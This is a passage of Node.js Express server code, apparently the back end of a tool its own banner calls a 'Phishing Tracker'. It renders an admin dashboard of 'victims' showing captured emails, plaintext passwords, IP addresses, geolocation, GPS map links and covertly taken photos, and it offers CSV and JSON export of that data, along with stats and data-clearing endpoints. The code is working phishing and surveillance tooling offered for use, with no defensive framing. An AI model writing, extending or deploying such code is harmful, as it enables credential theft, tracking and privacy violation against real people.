            csv += `"${v.ip || ''}","${v.geolocation?.country || ''}","${v.geolocation?.city || ''}",`;
            csv += `"${v.location?.latitude || ''}","${v.location?.longitude || ''}","${v.timestamp || ''}"\n`;
        });
        res.setHeader('Content-Disposition', `attachment; filename=victims-${moment().format('YYYY-MM-DD')}.csv`);
        res.setHeader('Content-Type', 'text/csv');
        return res.send(csv);
    }
    
    // View single victim
    if (id) {
        const victim = victims.get(id);
        if (!victim) {
            return res.status(404).send('Victim not found');
        }
        
        return res.json(victim);
    }
    
    // Dashboard HTML
    const victimsList = Array.from(victims.values()).reverse();
    const stats = {
        total: victims.size,
        today: victimsList.filter(v => moment(v.timestamp).isSame(moment(), 'day')).length,
        hour: victimsList.filter(v => moment(v.timestamp).isSame(moment(), 'hour')).length,
        photos: victimsList.filter(v => v.photo).length
    };
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
            body { background: #f5f5f5; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            h1 { color: #003868; margin-bottom: 20px; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 20px; }
            .stat-box { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .stat-value { font-size: 32px; font-weight: bold; color: #003868; }
            .stat-label { color: #666; font-size: 14px; }
            .actions { margin: 20px 0; }
            .btn { padding: 10px 20px; background: #003868; color: white; border: none; border-radius: 3px; cursor: pointer; margin-right: 10px; text-decoration: none; display: inline-block; }
            .btn-danger { background: #dc3545; }
            .btn-success { background: #28a745; }
            table { width: 100%; background: white; border-collapse: collapse; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            th { background: #003868; color: white; padding: 12px; text-align: left; }
            td { padding: 12px; border-bottom: 1px solid #eee; }
            tr:hover { background: #f9f9f9; }
            .badge { padding: 3px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; }
            .badge-success { background: #28a745; color: white; }
            .badge-warning { background: #ffc107; color: black; }
            .badge-danger { background: #dc3545; color: white; }
            .photo-preview { max-width: 100px; max-height: 100px; cursor: pointer; }
            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
            .modal-content { max-width: 800px; margin: 50px auto; background: white; padding: 20px; border-radius: 5px; }
            .close { float: right; cursor: pointer; font-size: 24px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Admin Dashboard</h1>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value">${stats.total}</div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value">${stats.today}</div>
                    <div class="stat-label">Today</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value">${stats.hour}</div>
                    <div class="stat-label">Last Hour</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value">${stats.photos}</div>
                    <div class="stat-label">With Photos</div>
                </div>
            </div>
            
            <div class="actions">
                <a href="/admin?format=json" class="btn btn-success">📥 Download JSON</a>
                <a href="/admin?format=csv" class="btn btn-success">📥 Download CSV</a>
                <button class="btn btn-danger" onclick="clearData()">🗑️ Clear All</button>
            </div>
            
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>ID</th>
                        <th>Type</th>
                        <th>Email</th>
                        <th>Password</th>
                        <th>IP</th>
                        <th>Country</th>
                        <th>Location</th>
                        <th>Photo</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody>
                    ${victimsList.map((v, i) => `
                    <tr>
                        <td>${i+1}</td>
                        <td><code>${v.victimId}</code></td>
                        <td><span class="badge badge-success">${v.type || 'Unknown'}</span></td>
                        <td>${v.credentials?.email || '-'}</td>
                        <td>${v.credentials?.password || '-'}</td>
                        <td>${v.ip || '-'}</td>
                        <td>${v.geolocation?.country || '-'}</td>
                        <td>
                            ${v.location ? 
                                `<a href="https://maps.google.com/?q=${v.location.latitude},${v.location.longitude}" target="_blank">📍 Map</a>` 
                                : '-'
                            }
                        </td>
                        <td>
                            ${v.photo ? 
                                `<img src="${v.photo}" class="photo-preview" onclick="showPhoto('${v.photo}')">` 
                                : '-'
                            }
                        </td>
                        <td>${moment(v.timestamp).format('HH:mm:ss')}</td>
                    </tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
        
        <div class="modal" id="photoModal" onclick="this.style.display='none'">
            <div class="modal-content">
                <span class="close" onclick="document.getElementById('photoModal').style.display='none'">&times;</span>
                <img id="modalPhoto" src="" style="width:100%;">
            </div>
        </div>
        
        <script>
            function showPhoto(src) {
                document.getElementById('modalPhoto').src = src;
                document.getElementById('photoModal').style.display = 'block';
            }
            
            function clearData() {
                if (confirm('Are you sure you want to delete all data?')) {
                    fetch('/api/clear', { method: 'POST' }).then(() => location.reload());
                }
            }
        </script>
    </body>
    </html>
    `);
});

app.post('/admin', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        return res.redirect('/admin');
    }
    res.status(401).send('Wrong password');
});

// =====================================================
// API CLEAR DATA
// =====================================================
app.post('/api/clear', (req, res) => {
    victims.clear();
    stats.totalLogins = 0;
    stats.totalPhotos = 0;
    res.json({ success: true });
});

// =====================================================
// API STATS
// =====================================================
app.get('/api/stats', (req, res) => {
    res.json({
        victims: victims.size,
        logins: stats.totalLogins,
        photos: stats.totalPhotos,
        uptime: moment.duration(Date.now() - stats.startTime).humanize(),
        memory: process.memoryUsage()
    });
});

// =====================================================
// HEALTH CHECK
// =====================================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        time: moment().format(),
        victims: victims.size,
        uptime: process.uptime()
    });
});

// =====================================================
// START SERVER
// =====================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║     🚀 PHISHING TRACKER - ULTIMATE EDITION 🚀               ║
╠══════════════════════════════════════════════════════════════╣
║  URL: http://localhost:${PORT}                                    
║  Port: ${PORT}                                                  
║  Telegram: ${bot ? '✅ ACTIVE' : '❌ DISABLED'}                  
║  Admin: http://localhost:${PORT}/admin                            
║  Password: ${ADMIN_PASSWORD}                                      
║  Victims Captured: ${victims.size}                                  
║  Total Logins: ${stats.totalLogins}                                  
║  Photos Captured: ${stats.totalPhotos}                                  
╚══════════════════════════════════════════════════════════════╝
    `);
});
